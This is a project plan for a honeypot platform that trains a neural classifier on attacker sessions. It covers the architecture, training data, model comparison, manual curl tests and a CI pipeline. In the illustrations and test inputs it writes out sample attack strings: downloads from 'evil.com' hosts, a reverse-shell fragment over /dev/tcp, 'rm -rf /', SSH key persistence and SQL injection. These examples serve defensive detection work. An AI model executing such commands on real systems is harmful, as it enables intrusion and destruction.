# AdaptiveShield Implementation Plan — Complete Self-Contained Guide

**Project**: AdaptiveShield — Multi-Agent Cyber Deception Platform  
**Branch**: `train` (base)  
**Target**: Unified neural model replacing 3-stage pipeline (Regex → Neural → MITRE fallback)  
**Runtime**: Docker Compose, CPU-only inference, RTX 3050 (5GB) for training  
**LLM**: `qwen2.5-coder:7b-instruct-q4_K_M` via Ollama at `http://192.168.56.1:11434`

---

## Executive Summary

Replace the current 3-stage classification pipeline with a **single unified neural model** that fuses:
1. **Command sequence** (BiLSTM with Attention, 256-dim output)
2. **MITRE tactics** (21-dim, real-time regex annotator)
3. **System changes** (~20-dim, decoy observation encoder)
4. **Binary triage** (70-dim: 12 static + 23 Ghidra + 25 Angr + 10 derived)

**Key Insight — Binary Feature Learning**: During training, the 181 real honeypot sessions that have full Ghidra/Angr analysis teach the TriageEncoder the correlation between quick static features (entropy, file size, packing) and deep binary analysis (CFG complexity, syscalls, crypto patterns). At runtime, only the fast static analyser runs (<100ms), but the TriageEncoder has already learned what those static signals *imply* about the deeper structure, because it saw them together during training.

**Action Policy**: Only brute-force → nftables block. All other threats → decoy redirect (engage & learn).

---

## Why BiLSTM? Architecture Comparison

Our command data consists of character-level sequences of bash commands and HTTP requests. Here is why we chose BiLSTM over alternatives:

### Normal Feed-Forward Neural Network (MLP)
- Treats input as a fixed-size flat vector — **no notion of sequence order**
- Would require flattening `cat /etc/passwd; wget evil.com/rat` into a bag-of-characters
- Loses all sequential context: can't distinguish `cat` (harmless) from `cat /etc/shadow` (credential access)
- **Verdict**: Unusable for variable-length command sequences

### Unidirectional LSTM
- Processes characters **left-to-right only**
- Understands that `wget` followed by `chmod +x` is suspicious
- But: when it sees `chmod +x`, it doesn't know what comes *after* (e.g., `./payload` vs `./setup.sh`)
- The final hidden state only captures left-context
- **Verdict**: Works, but loses backward context that helps disambiguate intent

### BiLSTM (What We Use)
- Two LSTMs: one reads **left→right**, one reads **right→left**
- At every character position, the model knows both what came *before* and what comes *after*
- When it sees `chmod +x` at position 50, the forward LSTM knows it followed `wget evil.com/rat`, and the backward LSTM knows it precedes `./rat; rm -rf /`
- Output: concatenation of both directions → 256-dim representation per timestep
- **Verdict**: Best for our use case — captures full bidirectional command context

### BiLSTM + Attention (What We Actually Use)
Standard BiLSTM uses only the final hidden state, which compresses the entire sequence into one vector — losing detail from early commands. Our attention mechanism ([model.py L77-83](file:///home/me/data/AdaptiveShield/src/training/neural/model.py#L77-L83)) adds a learned weighting over ALL timesteps:

```
attn_weights = softmax(Linear(Tanh(Linear(lstm_output))))  # [batch, seq_len, 1]
attended = sum(attn_weights * lstm_output, dim=1)           # [batch, 256]
```

This lets the model **focus on the most important characters/commands** in the sequence. For example, in a 2048-char session, the attention layer might assign high weight to the `POST /login.php?user=admin' OR 1=1--` portion and low weight to the `GET /favicon.ico` portion.

### Architecture Diagram

```
Input: "POST /login.php?user=admin' OR 1=1--; bash -i >& /dev/tcp/..."
  │
  ▼ Character-level tokenization (each char → ASCII index, max 2048)
  │
  ▼ CharacterEmbedding(256 vocab → 64-dim)
  │
  ▼ BiLSTM(2 layers, hidden=128, bidirectional → 256-dim per timestep)
  │
  ▼ Attention Pooling (learned weights over all timesteps → 256-dim)
  │
  ├── MitreEncoder(21 → 32)  ──┐
  ├── ChangeEncoder(20 → 32) ──┤
  ├── TriageEncoder(70 → 32) ──┤
  │                             ▼
  └───────── Concatenate: [256 + 32 + 32 + 32] = 384-dim
                                │
                                ▼ Fusion: Linear(384→128) → ReLU → Dropout → Linear(128→6)
                                │
                                ▼ Softmax → 6-class probability distribution
```

---

## Data Sources (All Complete)

### 1. `sessions_complete.csv` — 78,504 rows ✅
- **Source**: Real Cowrie/Dionaea honeypot sessions
- **Labels**: Safe (78,304), Destructive (127), ADVANCED_APT (49), Downloader (24)
- **Missing classes**: No Recon, No Exploit (these come from synthetic data)
- **Binary features**: 181 sessions have full real Ghidra/Angr analysis (all 70 triage columns populated)
- **Static triage**: 47,377 sessions have downloads with static triage (entropy, file size, etc.) but no deep analysis
- **MITRE**: Real annotations from `session_annotator.py`

### 2. `synthetic_batches.csv` — 10,387 rows ✅
- **Source**: LLM-generated blended HTTP+Bash sessions
- **Labels**: All 6 classes (Recon: 2,038, Safe: 2,010, Destructive: 2,000, Exploit: 1,999, ADVANCED_APT: 1,758, Downloader: 582)
- **Purpose**: Teach the model HTTP attack patterns (SQLi, XSS, path traversal) which the SSH honeypot never captured
- **Binary features**: All zeros (no real binaries) — correctly masked out during training
- **MITRE**: Computed by annotator with HTTP-aware regex patterns

### 3. `binary_features.csv` — 185 rows (reference only)
- Already merged into `sessions_complete.csv` via `download_shas`
- **Not loaded separately** — the real features are already in the session rows

---

## How Binary Feature Learning Works (Knowledge Transfer)

The key architectural insight: we have **three tiers** of binary knowledge in `sessions_complete.csv`:

| Tier | Sessions | What's Available | Triage Mask |
|------|----------|-----------------|-------------|
| **No binary** | ~31,000 | Commands + MITRE only | `True` (masked) |
| **Static only** | ~47,377 | Commands + MITRE + 12 static features (entropy, file size, packing, scores) | `False` (active) |
| **Full analysis** | 181 | Commands + MITRE + 12 static + 23 Ghidra + 25 Angr + 10 derived | `False` (active) |

During training, the `TriageEncoder(input_dim=70)` sees:
- **Tier 3 (181 sessions)**: All 70 features filled with real data. The encoder learns: "high entropy + is_packed + ghidra_has_aes_sbox + angr_has_crypto → likely ransomware". It learns the *joint distribution* of static and deep features.
- **Tier 2 (47K sessions)**: Only the first 12 features filled, rest are zero. The encoder still learns patterns from static features alone, but the weights it learned from Tier 3 inform how it interprets them.
- **Tier 1 (31K sessions)**: All zeros → `modality_mask = True` → triage encoder output is zeroed → model classifies using commands + MITRE only.

**At runtime**: Only `static_analyzer.py` runs (fast, <100ms). It fills the first 12 of the 70 triage features. The remaining 58 (Ghidra/Angr/derived) are zero. But the TriageEncoder has already learned from Tier 3 what those 12 static features *correlate with* in the deep analysis — so its 32-dim output still carries meaningful signal.

---

## Current State (as of 2026-09-25)

### ✅ Completed
1. **Ollama + Qwen model** — configured at `192.168.56.1:11434`
2. **Synthetic data generation** — 10,387 sessions in `synthetic_batches.csv`
3. **Core architecture**:
   - `model.py` — `UnifiedThreatClassifier` with 4-modality fusion (384-dim)
   - `dataset.py` — `ThreatDataset` with 70-dim triage, 2048 max_length, robust label_id handling
   - `trainer.py` — extracts and passes mitre, changes, triage, modality_mask
   - `train_neural.py` — training entry point, default max_length=2048
   - `decision.py` — runtime inference with 70-dim triage zeros
4. **MITRE annotator upgraded** — HTTP regex patterns (SQLi, XSS, scanners) added to `attack_mapping.py`
5. **Binary pipeline verified** — `feature_merger.py` correctly flattens Ghidra/Angr JSON → 70 columns in `sessions_complete.csv`

### 🔄 In Progress
6. Neural training running on host machine

### ⬜ Not Started
7. Model comparison & selection
8. Manual testing with model swapping
9. Modify runtime interceptors
10. Modify decoy integration
11. Final integration test
12. CI/CD pipeline

---

## Execution Steps

### Step 5: Run Neural Training (IN PROGRESS — on host machine)

```cmd
python src\training\neural\train_neural.py --batch-size 32 --epochs 100 --lr 3e-4 --weight-decay 1e-3 --patience 10
```

**What happens**:
1. Loads `sessions_complete.csv` (78K real sessions with 4 classes)
2. Loads `synthetic_batches.csv` (10K synthetic with all 6 classes)
3. Concatenates, downsamples Safe to 5,000, shuffles
4. Splits into train/val/test (70/15/15)
5. For each sample, `ThreatDataset` builds:
   - `commands`: char indices, padded to batch max (up to 2048)
   - `mitre`: 21-dim real MITRE tactic vector
   - `changes`: 20-dim (zeros for real data, LLM-derived for synthetic)
   - `triage`: 70-dim (real binary features for 181 sessions, static-only for 47K, zeros for rest)
   - `modality_mask`: 4 booleans `[cmd_missing, mitre_missing, changes_missing, triage_missing]`
6. Trains `UnifiedThreatClassifier` with focal loss + class weights
7. Early stopping on validation F1 (patience=10)
8. Saves checkpoint to `checkpoints/best_model.pt` during training
9. At the end, loads best checkpoint → runs final test evaluation → saves to `models/brain_v5_neural.pt`

**Note**: `best_model.pt` and `brain_v5_neural.pt` contain identical weights. The trainer saves checkpoints to `best_model.pt` mid-training whenever validation F1 improves, then at the end it reloads that best checkpoint and re-saves as the final named model.

### Step 6: Model Comparison & Selection

We have multiple trained models in `models/`. After the new unified model finishes training, we compare them all.

**Existing models:**

| Model | Type | Val F1 | Epochs | Architecture |
|-------|------|--------|--------|-------------|
| `brain_v5_neural` | BiLSTM+MITRE (old 2-modality) | 1.0 | 25 | 100-dim structured, max_length=512 |
| `brain_v5_mitre_only` | MITRE-only | 0.953 | 21 | 21-dim MITRE features only |
| `brain_v5_mitre_only_balanced` | MITRE-only balanced | 0.993 | 15 | 21-dim, balanced sampling |
| `brain_v5_semantic_balanced` | Semantic labels | 0.991 | 18 | Semantic labeling mode |
| `brain_v6_neural` | **NEW 4-modality** | TBD | TBD | 70-dim triage, max_length=2048, HTTP+SSH |
| `brain_v6_neural_2048` | **NEW 4-modality** | TBD | TBD | 70-dim triage, max_length=2048, HTTP+SSH |


**How to compare**: Run all models against the same test set using a comparison script:

```bash
# Compare script (to be created: src/training/neural/compare_models.py)
PYTHONPATH=src python3 src/training/neural/compare_models.py \
    --models models/brain_v5_neural.pt models/brain_v6_unified.pt \
    --test-data data/exports/sessions_complete.csv
```

The comparison script will:
1. Load each model and run inference on the same test split
2. Report per-class F1, precision, recall, confusion matrix
3. Specifically test on **HTTP attack patterns** (where the old model should fail and new model should succeed)
4. Report inference latency (ms per sample) — important for runtime

**Key comparison criteria** (in priority order):
1. **Per-class F1 on minority classes** (APT, Destructive, Downloader) — not overall accuracy
2. **HTTP attack detection** — does it correctly classify SQLi, XSS, path traversal?
3. **False positive rate on Safe class** — must not redirect legitimate traffic to decoys
4. **Inference speed** — must classify within 50ms for real-time proxy use

### Step 7: Manual Testing — Swapping Models at Runtime

`decision.py` loads the model from a hardcoded path: `models/brain_v6_unified.pt` ([decision.py L181](file:///home/me/data/AdaptiveShield/src/agents/decision.py#L181)).

**To swap and test different models manually:**

```bash
# Option 1: Rename the model file
cp models/brain_v6_unified.pt models/brain_v6_unified_backup.pt
cp models/brain_v5_neural.pt models/brain_v6_unified.pt
# Now restart the Docker service → it loads the old model
docker compose restart core

# Option 2: Use a symlink (cleaner)
cd models/
ln -sf brain_v5_neural.pt brain_v6_unified.pt   # point to old model
# Restart to test
docker compose restart core
ln -sf brain_v6_actual.pt brain_v6_unified.pt    # point to new model
docker compose restart core
```

**Manual test commands after swapping:**

```bash
# Test 1: Safe traffic (should NOT redirect)
curl http://127.0.0.1/index.html

# Test 2: SQL injection (should → redirect_to_decoy)
curl "http://127.0.0.1/login?user=admin'%20OR%201=1--"

# Test 3: Path traversal (should → redirect_to_decoy)
curl "http://127.0.0.1/../../etc/passwd"

# Test 4: SSH recon (should → forward_and_log)
# From SSH proxy: run `id; whoami; uname -a; cat /etc/passwd`

# Test 5: SSH APT (should → redirect_to_decoy)
# From SSH proxy: run `wget evil.com/rat; chmod +x rat; echo "ssh-rsa ..." >> ~/.ssh/authorized_keys; crontab -e`
```

Compare the `action` and `neural_probs` output between models to see which one makes better decisions.

### Step 8: Modify Runtime Interceptors

Files: `http_proxy.py`, `ssh_proxy.py`, `session_store.py`

1. **`http_proxy.py`**: Feed HTTP requests → unified model (commands + MITRE, triage masked). After binary download, run `static_analyzer.py` → fill 12 static triage features → re-classify with triage active.
2. **`ssh_proxy.py`**: Feed SSH commands → unified model. Update change vector after each command, re-run model. If binary downloaded, add static triage.
3. **`session_store.py`**: Add `binary_cache` + `system_changes` tables for progressive feature accumulation.

**Action mapping**:

| Label | Action | Deception Agent Behavior |
|-------|--------|--------------------------|
| Safe | `forward` | Pass to real service |
| Recon | `forward_and_log` | Pass but monitor |
| Downloader | `redirect_to_decoy` | Engage in decoy, watch downloads |
| Exploit | `redirect_to_decoy` | Present vulnerable surfaces |
| Destructive | `redirect_to_decoy` | Let them "destroy" fake data |
| ADVANCED_APT | `redirect_to_decoy` | Full engagement, track persistence |

> Old model used `drop_and_block` for Destructive/APT. New: ALL threats → decoy (only brute-force → block).

### Step 9: Modify Decoy Integration

Files: `ssh_decoy_builder.py`, `generator.py`, `orchestrator/main.py`

**Deception Agent uses the decision output**:
- `decision.get("label")` → base behavior template
- `decision.get("neural_probs")` → probability distribution for adaptive engagement
  - If APT probability rising → prepare persistence targets
  - If Destructive high → present expendable fake data
- `decision.get("mitre_tactics")` → craft contextual fake responses
- Re-classifies after each interaction → adapts in real-time

### Step 10: Final Integration Test

```bash
docker compose up -d --build
curl http://127.0.0.1/health
# Test: SQLi → decoy redirect (NOT blocked)
# Test: SSH brute-force (5 attempts) → nftables block
# Test: Exploit drops binary → static triage → classification updated
# Test: Repeated payload → cache hit → instant
```

### Step 11: CI/CD Pipeline

The current `.github/workflows/ci.yml` only runs `compileall` and a smoke import. We need a real pipeline.

#### 11a: Test Suite Structure

```
tests/
├── unit/
│   ├── test_mitre_annotator.py      # MITRE regex patterns fire correctly
│   ├── test_dataset.py              # ThreatDataset builds correct tensors
│   ├── test_model_architecture.py   # Model shapes, forward pass, modality mask
│   ├── test_command_tokenizer.py    # Char tokenizer encodes/pads correctly
│   ├── test_change_encoder.py       # Change encoder produces 20-dim vectors
│   └── test_decision_logic.py       # Action mapping (Safe→forward, APT→decoy)
├── integration/
│   ├── test_training_pipeline.py    # Load data → train 1 epoch → save → reload
│   ├── test_inference_pipeline.py   # Load model → classify sample inputs → check outputs
│   ├── test_http_proxy.py           # HTTP request → decision → correct action
│   └── test_ssh_proxy.py            # SSH commands → decision → correct action
├── regression/
│   ├── test_known_attacks.py        # Golden test: known SQLi/XSS/APT commands → expected class
│   └── test_model_performance.py    # Load model → run on test set → F1 must exceed threshold
└── conftest.py                      # Shared fixtures (sample data, model loading)
```

#### 11b: CI Workflow (`.github/workflows/ci.yml`)

**Triggers**: Push to `main` or `train`, all PRs  
**Jobs**:

1. **`lint`** — `ruff check src/` + `mypy src/` (fast, catches obvious bugs)
2. **`unit-tests`** — `pytest tests/unit/ -v` (no GPU, no model files needed, ~30s)
3. **`integration-tests`** — `pytest tests/integration/ -v` (needs model file, uses CPU, ~2min)
4. **`regression-tests`** — `pytest tests/regression/ -v --tb=long` (loads model, runs golden attack set)
5. **`docker-build`** — `docker compose build` (verifies Dockerfiles still work)

**Model file handling in CI**: The `.pt` model file is too large for git. Options:
- **Git LFS**: Track `models/*.pt` with LFS. CI pulls from LFS automatically.
- **GitHub Release artifact**: Upload model to a GitHub Release. CI downloads it in a setup step.
- **Skip model-dependent tests on PR**: Only run unit tests on PR; run full suite on merge to main.

#### 11c: GitHub Actions Workflow (Updated)

```yaml
name: CI
on:
  push:
    branches: [main, train]
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v4
        with: { python-version: '3.12' }
      - run: pip install ruff
      - run: ruff check src/ --select E,F,W

  unit-tests:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v4
        with: { python-version: '3.12' }
      - run: pip install -r requirements.txt
      - run: PYTHONPATH=src pytest tests/unit/ -v --tb=short

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    if: github.event_name == 'push'
    steps:
      - uses: actions/checkout@v4
        with: { lfs: true }
      - uses: actions/setup-python@v4
        with: { python-version: '3.12' }
      - run: pip install -r requirements.txt
      - run: PYTHONPATH=src pytest tests/integration/ -v --tb=long

  docker-build:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - run: docker compose build --no-cache
```

#### 11d: Key Test Cases (What to Assert)

| Test | Input | Expected |
|------|-------|----------|
| MITRE: SQLi detection | `GET /login?user=admin' OR 1=1--` | tactic `initial_access`, technique `T1190` |
| MITRE: SSH recon | `id; whoami; cat /etc/passwd` | tactic `discovery` |
| Model: Forward pass shape | batch of 4 samples | logits shape `[4, 6]` |
| Model: Modality mask | all-zero triage input | triage_mask = True |
| Model: Safe classification | `ls; pwd; exit` | class 0 (Safe), confidence > 0.8 |
| Decision: Action mapping | class=ADVANCED_APT | action=`redirect_to_decoy` |
| Regression: Known APT | `wget c2.evil.com/rat; crontab...` | class=ADVANCED_APT, F1 > 0.85 |
| Docker: Build succeeds | `docker compose build` | exit code 0 |

---

## Key References

| Component | File |
|-----------|------|
| MITRE KB | `src/core/mitre/attack_mapping.py` |
| Session annotation | `src/core/mitre/session_annotator.py` |
| LLM Synthetic Generator | `src/training/neural/llm_synthetic.py` |
| LLM Client | `src/honeypot/llm_client.py` |
| LLM Router | `src/honeypot/router.py` |
| Unified Model | `src/training/neural/model.py` |
| 4-Modality Dataset | `src/training/neural/dataset.py` |
| Training Entry | `src/training/neural/train_neural.py` |
| Trainer Loop | `src/training/neural/trainer.py` |
| Decision Agent | `src/agents/decision.py` |
| Static Analyzer | `src/core/malware/static_analyzer.py` |
| Feature Merger | `src/core/malware/feature_merger.py` |
| Ghidra Extract | `src/core/malware/ghidra_extract.py` |
| Angr Symbolic | `src/core/malware/symbolic.py` |
| Change Encoder | `src/agents/change_encoder.py` |
| HTTP Guard | `src/interceptor/http_proxy.py` |
| SSH Guard | `src/interceptor/ssh_proxy.py` |
| SSH Decoy Builder | `src/honeypot/ssh_decoy_builder.py` |
| HTTP Decoy Generator | `src/honeypot/generator.py` |
| Orchestrator | `src/orchestrator/main.py` |
| Model Comparison | `src/training/neural/compare_models.py` (to be created) |
| CI/CD Workflow | `.github/workflows/ci.yml` |
| Test Suite | `tests/` (to be created) |

---

**End of Plan**